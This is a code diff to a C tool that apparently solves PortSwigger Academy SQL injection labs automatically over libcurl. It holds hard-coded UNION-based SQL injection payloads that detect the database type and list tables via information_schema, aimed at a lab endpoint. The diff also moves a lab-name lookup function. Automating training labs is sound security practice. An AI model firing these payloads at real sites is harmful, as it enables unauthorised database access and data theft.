@@ -5,14 +5,80 @@
 #include <curl/curl.h>
 
 
-size_t write_callback(void *data, size_t size, size_t count, void *output_buffer) {
+typedef struct {
+    const char *lab_name;
+    int lab_id;
+} LabMapping;
+
+int extract_lab_id(const char *html_content) {
+    // PAAS supports the SQLi labs listed below
+    LabMapping lab_mappings[] = {
+            {"SQL injection vulnerability in WHERE clause allowing retrieval of hidden data",       1},
+            {"SQL injection vulnerability allowing login bypass",                                   2},
+            {"SQL injection attack, querying the database type and version on Oracle",              3},
+            {"SQL injection attack, querying the database type and version on MySQL and Microsoft", 4},
+            {"SQL injection attack, listing the database contents on non-Oracle databases",         5},
+            {"SQL injection attack, listing the database contents on Oracle",                       6},
+            {"SQL injection UNION attack, determining the number of columns returned by the query", 7},
+            {"SQL injection UNION attack, finding a column containing text",                        8},
+            {"SQL injection UNION attack, retrieving data from other tables",                       9},
+            {"SQL injection UNION attack, retrieving multiple values in a single column",           10},
+            {"Blind SQL injection with conditional responses",                                      11},
+            {"Blind SQL injection with conditional errors",                                         12},
+            {"Visible error-based SQL injection",                                                   13},
+            {"Blind SQL injection with time delays",                                                14},
+            {"Blind SQL injection with time delays and information retrieval",                      15}
+    };
+
+    const char *title_start = "<title>";
+    const char *title_end = "</title>";
+
+    int lab_id = -1;
+    const char *start = html_content;
+
+    while ((start = strstr(html_content, title_start)) != NULL) {
+        start += strlen(title_start);
+        const char *end = strstr(start, title_end);
+
+        if (end) {
+            char lab_name[150] = "";
+            size_t lab_name_len = end - start;
+
+            if (lab_name_len >= sizeof(lab_name)) {
+                fprintf(stderr, "Lab name is too long! (error code 24)\n");
+                return -1;
+            }
+
+            strncpy(lab_name, start, lab_name_len);
+            lab_name[lab_name_len] = '\0';
+
+            for (size_t i = 0; i < sizeof(lab_mappings) / sizeof(lab_mappings[0]); i++) {
+                if (strcmp(lab_name, lab_mappings[i].lab_name) == 0) {
+                    lab_id = lab_mappings[i].lab_id;
+                    return lab_id;
+                }
+            }
+        }
+
+        if (end == NULL) {
+            break;
+        }
+
+        start = end + strlen(title_end);
+    }
+
+    return -1;
+}
+
+
+size_t write_callback(const char *data, size_t size, size_t count, void *output_buffer) {
     size_t total_size = size * count;
     strncat(output_buffer, data, strlen(data));
     return total_size;
 }
 
 
-static size_t HeaderCallback(void *data, size_t size, size_t count, void *output_header) {
+static size_t HeaderCallback(const char *data, size_t size, size_t count, void *output_header) {
     size_t total_size = size * count;
     strncat(output_header, data, strlen(data));
     return total_size;
@@ -102,74 +168,6 @@ void show_paas_ascii_art() {
     printf("\n[P]\033[0mortswigger \033[38;5;208m[A]\033[0mcademy \033[38;5;208m[A]\033[0mutomatic \033[38;5;208m[S]\033[0molver \n");
     printf("by \033[38;5;208mmr246\033[0m \n\n");
 }
-
-
-typedef struct {
-    const char *lab_name;
-    int lab_id;
-} LabMapping;
-
-
-int extract_lab_id(const char *html_content) {
-    // PAAS supports the SQLi labs listed below
-    LabMapping lab_mappings[] = {
-            {"SQL injection vulnerability in WHERE clause allowing retrieval of hidden data",       1},
-            {"SQL injection vulnerability allowing login bypass",                                   2},
-            {"SQL injection attack, querying the database type and version on Oracle",              3},
-            {"SQL injection attack, querying the database type and version on MySQL and Microsoft", 4},
-            {"SQL injection attack, listing the database contents on non-Oracle databases",         5},
-            {"SQL injection attack, listing the database contents on Oracle",                       6},
-            {"SQL injection UNION attack, determining the number of columns returned by the query", 7},
-            {"SQL injection UNION attack, finding a column containing text",                        8},
-            {"SQL injection UNION attack, retrieving data from other tables",                       9},
-            {"SQL injection UNION attack, retrieving multiple values in a single column",           10},
-            {"Blind SQL injection with conditional responses",                                      11},
-            {"Blind SQL injection with conditional errors",                                         12},
-            {"Visible error-based SQL injection",                                                   13},
-            {"Blind SQL injection with time delays",                                                14},
-            {"Blind SQL injection with time delays and information retrieval",                      15}
-    };
-
-    const char *title_start = "<title>";
-    const char *title_end = "</title>";
-
-    int lab_id = -1;
-    const char *start = html_content;
-
-    while ((start = strstr(html_content, title_start)) != NULL) {
-        start += strlen(title_start);
-        const char *end = strstr(start, title_end);
-
-        if (end) {
-            char lab_name[150] = "";
-            size_t lab_name_len = end - start;
-
-            if (lab_name_len >= sizeof(lab_name)) {
-                fprintf(stderr, "Lab name is too long! (error code 24)\n");
-                return -1;
-            }
-
-            strncpy(lab_name, start, lab_name_len);
-            lab_name[lab_name_len] = '\0';
-
-            for (size_t i = 0; i < sizeof(lab_mappings) / sizeof(lab_mappings[0]); i++) {
-                if (strcmp(lab_name, lab_mappings[i].lab_name) == 0) {
-                    lab_id = lab_mappings[i].lab_id;
-                    return lab_id;
-                }
-            }
-        }
-
-        if (end == NULL) {
-            break;
-        }
-
-        start = end + strlen(title_end);
-    }
-
-    return -1;
-}
-
 
 
 int detect_column_count(char *url, char *response_buffer, CURLcode res, CURL *curl, char* comment_sign) {
@@ -282,9 +280,9 @@ int vulnerabilities(char *url) {
                 goto quit;
 
             // step two - determine the database type
-            char sqli_payload[] = "/filter?category=Accessories'+UNION+SELECT+'abc'";
-            char sqli_payload_repeat[] = ",'test'";
-            char sqli_payload_end[] = "+FROM+dual--";
+            char sqli_payload[75] = "/filter?category=Accessories'+UNION+SELECT+'abc'";
+            char sqli_payload_repeat[150] = ",'test'";
+            char sqli_payload_end[15] = "+FROM+dual--";
 
             int f = 1;
             while(f != i) {
@@ -334,9 +332,9 @@ int vulnerabilities(char *url) {
                 goto quit;
 
             // step two - determine the database type
-            char sqli_payload[] = "/filter?category=Accessories'+UNION+SELECT+'abc'";
-            char sqli_payload_repeat[] = ",'test'";
-            char sqli_payload_end[] = "%23";
+            char sqli_payload[75] = "/filter?category=Accessories'+UNION+SELECT+'abc'";
+            char sqli_payload_repeat[150] = ",'test'";
+            char sqli_payload_end[10] = "%23";
             int f = 1;
             while (f < i) {
                 strncat(sqli_payload, sqli_payload_repeat, strlen(sqli_payload_repeat));
@@ -388,9 +386,9 @@ int vulnerabilities(char *url) {
                 goto quit;
 
             // step two - retrieve the list of tables in the database
-            char sqli_payload[] = "/filter?category=Accessories'+UNION+SELECT+table_name";
-            char sqli_payload_repeat[] = ",+NULL";
-            char sqli_payload_end[] = "+FROM+information_schema.tables--";
+            char sqli_payload[75] = "/filter?category=Accessories'+UNION+SELECT+table_name";
+            char sqli_payload_repeat[150] = ",+NULL";
+            char sqli_payload_end[50] = "+FROM+information_schema.tables--";
             int f = 1;
             while (f < i) {
                 strncat(sqli_payload, sqli_payload_repeat, strlen(sqli_payload_repeat));
